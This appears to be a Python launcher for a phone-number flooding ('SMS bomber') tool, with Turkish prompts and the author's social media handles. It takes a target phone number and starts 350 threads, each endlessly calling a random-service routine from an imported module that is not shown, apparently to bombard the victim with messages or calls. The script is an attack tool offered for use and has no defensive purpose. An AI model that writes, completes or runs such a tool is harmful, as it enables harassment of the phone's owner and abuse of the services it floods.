import sys, os, pyfiglet
from StructService import Distribution_Service
from threading import Thread
from colorama import Fore

attack_number_phone = Distribution_Service()


def start(phone):
	attack_number_phone.phone(phone)

	while True:
		try:
			attack_number_phone.random_service()
		except Exception as ex:
			print(ex)


os.system('clear')

print(Fore.YELLOW + pyfiglet.figlet_format("umutnzl"))
print('============')
print(Fore.GREEN + 'telegram:@umutnzl21')
print(Fore.YELLOW + 'instagram:umutnazli88')
print(Fore.GREEN +  'not numarayi girerken ülke kodu ile girin türkiye ülke kodu +90')
phone = input('Telefon No: ')
print('============')

try:
	attack_number_phone.phone(phone)
except:
	print(Fore.RED +
	      ' +xxxxxxxxxxxx')
	sys.exit()

for i in range(350):
	th = Thread(target=start, args=(phone, ))
	th.start()
